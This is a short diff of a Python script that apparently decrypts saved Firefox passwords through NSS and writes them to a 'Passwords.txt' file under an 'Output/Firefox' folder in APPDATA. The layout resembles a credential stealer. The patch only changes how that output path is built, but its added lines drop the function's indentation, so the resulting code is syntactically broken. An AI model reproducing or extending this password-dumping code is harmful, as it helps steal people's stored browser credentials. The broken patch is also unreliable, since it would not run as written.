@@ -214,9 +214,14 @@ def main():
     nss.shutdown()
 
     # Save to %TEMP%/Output/Firefox
-    tmp_dir = os.path.join(os.environ.get("APPDATA", tempfile.gettempdir()), "Output", "Firefox")
-    os.makedirs(tmp_dir, exist_ok=True)
-    output_file = os.path.join(tmp_dir, "Passwords.txt")
+base_dir = os.environ.get("APPDATA", tempfile.gettempdir())
+
+# Define folder structure
+tmp_dir = os.path.join(base_dir, "output", "Firefox")
+os.makedirs(tmp_dir, exist_ok=True)
+
+# Define output file path
+output_file = os.path.join(tmp_dir, "Passwords.txt")
 
     with open(output_file, "w", encoding=DEFAULT_ENCODING) as f:
         for output in outputs:
